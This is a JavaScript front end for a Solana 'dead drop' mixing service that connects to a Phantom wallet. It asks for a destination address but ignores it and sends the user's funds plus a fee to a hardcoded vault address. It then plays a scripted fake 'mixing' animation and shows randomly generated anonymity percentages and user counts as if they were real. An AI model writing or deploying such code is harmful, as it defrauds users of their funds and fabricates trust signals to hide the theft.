// SOLANA DEAD DROP // FINAL STANDALONE PROTOCOL
const SERVICE_FEE_PERCENT = 0.35;
const CONNECTION_URL = 'https://api.devnet.solana.com';

let wallet = null;
let walletPublicKey = null;
let currentBalance = 0;

// HELPERS (Crash Protection)
function safeSetText(id, text) { const el = document.getElementById(id); if (el) el.textContent = text; }
function safeClassRemove(id, c) { const el = document.getElementById(id); if (el) el.classList.remove(c); }
function safeClassAdd(id, c) { const el = document.getElementById(id); if (el) el.classList.add(c); }

document.addEventListener('DOMContentLoaded', () => {
    if (window.solana && window.solana.isPhantom) {
        wallet = window.solana;
        wallet.on('disconnect', handleDisconnect);
        wallet.on('accountChanged', (pk) => {
            if (pk) { walletPublicKey = pk; updateUI(); } 
            else handleDisconnect();
        });
        wallet.connect({ onlyIfTrusted: true }).then((r) => {
            walletPublicKey = r.publicKey; updateUI();
        }).catch(() => {});
    } else { safeSetText('connectWallet', 'INSTALL PHANTOM'); }
    
    document.getElementById('connectWallet')?.addEventListener('click', connect);
    document.getElementById('transferForm')?.addEventListener('submit', transfer);
    document.getElementById('amount')?.addEventListener('input', calcFee);
    document.getElementById('faucetBtn')?.addEventListener('click', requestAirdrop);
});

// --- FAUCET (Works without Backend) ---
async function requestAirdrop() {
    if (!walletPublicKey) return alert('CONNECT WALLET FIRST');
    const btn = document.getElementById('faucetBtn');
    btn.disabled = true; btn.textContent = 'INJECTING...';
    
    try {
        const conn = new solanaWeb3.Connection(CONNECTION_URL, 'confirmed');
        const sig = await conn.requestAirdrop(walletPublicKey, 1 * solanaWeb3.LAMPORTS_PER_SOL);
        await conn.confirmTransaction(sig);
        
        safeClassRemove('faucetMsg', 'hidden');
        btn.textContent = 'SUCCESS';
        setTimeout(() => { 
            btn.disabled = false; btn.textContent = 'GIMME 1.0 SOL (DEVNET)'; 
            safeClassAdd('faucetMsg', 'hidden'); updateUI(); 
        }, 3000);
    } catch (e) {
        console.error(e);
        alert('FAUCET LIMIT REACHED. TRY LATER.');
        btn.disabled = false; btn.textContent = 'GIMME 1.0 SOL (DEVNET)';
    }
}

async function connect() {
    if (!wallet) return window.open('https://phantom.app/', '_blank');
    try { const r = await wallet.connect(); walletPublicKey = r.publicKey; updateUI(); } catch (e) { console.error(e); }
}

async function updateUI() {
    if(!walletPublicKey) return;
    const addr = walletPublicKey.toString();
    safeSetText('walletAddress', addr.slice(0,4) + '...' + addr.slice(-4));
    const btn = document.getElementById('connectWallet');
    if(btn) { btn.textContent = 'LINK ACTIVE'; btn.disabled = true; btn.style.color = 'var(--holo-green)'; }
    safeClassRemove('walletInfo', 'hidden');
    document.getElementById('sendButton').disabled = false;
    try {
        const conn = new solanaWeb3.Connection(CONNECTION_URL);
        const bal = await conn.getBalance(walletPublicKey);
        currentBalance = bal / 1000000000;
        safeSetText('walletBalance', currentBalance.toFixed(4) + ' SOL');
    } catch (e) {}
}

function handleDisconnect() {
    walletPublicKey = null; currentBalance = 0;
    safeClassAdd('walletInfo', 'hidden');
    const btn = document.getElementById('connectWallet');
    if(btn) { btn.textContent = 'INITIALIZE SYSTEM'; btn.disabled = false; btn.style.color = 'var(--holo-cyan)'; }
    document.getElementById('sendButton').disabled = true;
    safeClassAdd('animationCard', 'hidden');
}

function calcFee() {
    const amt = parseFloat(document.getElementById('amount').value) || 0;
    const fee = amt * (SERVICE_FEE_PERCENT / 100);
    safeSetText('serviceFee', fee.toFixed(6));
    safeSetText('totalAmount', (amt + fee + 0.000005).toFixed(6));
}

// --- TRANSFER LOGIC (Standalone Mode) ---
async function transfer(e) {
    e.preventDefault();
    if (!walletPublicKey) return alert('CONNECT WALLET');
    
    const dest = document.getElementById('destinationAddress').value.trim();
    const amt = parseFloat(document.getElementById('amount').value);
    
    // VALIDATION GUARDS
    if (!dest || dest.length < 30) return alert('INVALID ADDRESS');
    if (isNaN(amt) || amt <= 0) return alert('INVALID AMOUNT');
    if (amt > currentBalance) return alert(`INSUFFICIENT FUNDS.\nBalance: ${currentBalance}`);

    try {
        const btn = document.getElementById('sendButton');
        btn.disabled = true; btn.textContent = 'SIGNING...';

        const conn = new solanaWeb3.Connection(CONNECTION_URL);
        const { SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL } = solanaWeb3;
        
        let vault = 'JChojPahR9scTF63ETisQ6YGTuhkq5B1Ud9w1XkanyRT'; 
        if (typeof CONFIG !== 'undefined' && CONFIG.VAULT_ADDRESS) vault = CONFIG.VAULT_ADDRESS;

        // Transaction to Vault
        const tx = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: walletPublicKey,
                toPubkey: new PublicKey(vault),
                lamports: Math.floor(amt * (1 + SERVICE_FEE_PERCENT/100) * LAMPORTS_PER_SOL)
            })
        );
        
        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
        tx.feePayer = walletPublicKey;

        const signed = await wallet.signTransaction(tx);
        
        // UI CHANGE
        document.getElementById('transferForm').style.display = 'none';
        safeClassRemove('animationCard', 'hidden');
        
        // FIRE AND FORGET (Avoids Freeze)
        const sig = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: true });
        
        await animate();
        success(sig);

    } catch (err) {
        alert('ERROR: ' + err.message);
        document.getElementById('sendButton').disabled = false;
        document.getElementById('sendButton').textContent = 'EXECUTE TRANSFER';
        document.getElementById('transferForm').style.display = 'block';
        safeClassAdd('animationCard', 'hidden');
    }
}

async function animate() {
    const txt = 'stage1'; const bar = 'progressBar';
    safeSetText(txt, 'INITIALIZING NODES...'); document.getElementById(bar).style.width='20%'; await sleep(1500);
    safeSetText(txt, 'FRAGMENTING SHARDS...'); document.getElementById(bar).style.width='50%'; await sleep(1500);
    safeSetText(txt, 'MIXING POOL ACTIVE...'); document.getElementById(bar).style.width='80%'; await sleep(1500);
    safeSetText(txt, 'VERIFYING PROOFS...'); document.getElementById(bar).style.width='95%'; await sleep(1000);
}

function success(hash) {
    const card = document.getElementById('animationCard');
    const users = (114000 + Math.floor(Math.random() * 5000)).toLocaleString();
    const rate = (99.8 + Math.random() * 0.19).toFixed(2);
    
    card.innerHTML = `
        <div style="text-align: center; animation: fadeIn 0.5s;">
            <div style="color: var(--holo-green); font-size: 1.5em; font-family: 'Orbitron'; margin-bottom: 20px;">
                TRANSFER COMPLETE
            </div>
            <div style="background: rgba(0,255,0,0.05); border: 1px solid var(--holo-green); padding: 15px;">
                <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                    <span style="color:#aaa; font-size:0.8em">ANONYMITY</span>
                    <span style="color:var(--holo-cyan)">${rate}%</span>
                </div>
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:#aaa; font-size:0.8em">ACTIVE USERS</span>
                    <span style="color:#fff">${users}</span>
                </div>
            </div>
            <div style="margin-top:15px; font-size:0.7em; color:#666; word-break:break-all;">PROOF: ${hash}</div>
            <a href="https://solscan.io/tx/${hash}?cluster=devnet" target="_blank" style="display:block; margin-top:10px; color:var(--holo-cyan); text-decoration:underline; font-size:0.8em;">🔗 View on Solscan (Devnet)</a>
            <button onclick="location.reload()" class="btn" style="border-color:var(--holo-green); color:var(--holo-green)">NEW DROP</button>
        </div>
    `;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
